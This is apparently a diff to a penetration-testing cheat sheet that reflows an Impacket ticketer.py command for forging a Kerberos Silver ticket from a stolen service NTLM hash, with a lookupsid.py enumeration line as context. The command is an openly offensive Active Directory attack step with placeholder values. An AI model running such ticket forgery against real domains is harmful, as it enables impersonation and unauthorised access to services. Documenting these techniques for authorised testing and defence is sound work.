@@ -10,13 +10,6 @@ lookupsid.py domain.local/username@dc01.domain.local
 
 - Creating an Silver ticket 
 ```
-ticketer.py \
--nthash <SERVICE_OR_MACHINE_NTLM_HASH> \
--domain-sid <DOMAIN_SID> \
--domain <DOMAIN_FQDN> \
--spn <SERVICE>/<TARGET_HOST> \
--user-id <RID> \
--groups <GROUP_RIDS_COMMA_SEPARATED> \
-<USERNAME>
+ticketer.py -nthash <SERVICE_OR_MACHINE_NTLM_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN_FQDN> -spn <SERVICE>/<TARGET_HOST> -user-id <RID> -groups <GROUP_RIDS_COMMA_SEPARATED> <USERNAME>
 ```
 
